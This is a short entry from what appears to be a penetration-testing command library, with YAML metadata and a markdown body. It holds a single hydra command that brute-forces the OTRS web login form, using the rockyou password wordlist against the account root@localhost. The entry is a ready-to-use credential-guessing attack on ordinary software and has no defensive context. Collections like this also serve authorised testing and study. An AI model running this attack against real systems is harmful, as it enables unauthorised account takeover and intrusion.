---
id: ec3892fe-39da-4156-958d-d069c7b85cd8
name: bruteforce http_post with example post-data
type: command
executor: bash
data: 'hydra -l root@localhost -P /usr/share/wordlists/rockyou.txt target-ip http-post-form
  "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-60&User=^USER^&Password=^PASS^:
  Login failed!"

  '
output: null
created_at: '2020-07-14T18:14:30.728505+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# bruteforce http_post with example post-data

```bash
hydra -l root@localhost -P /usr/share/wordlists/rockyou.txt target-ip http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-60&User=^USER^&Password=^PASS^: Login failed!"

```


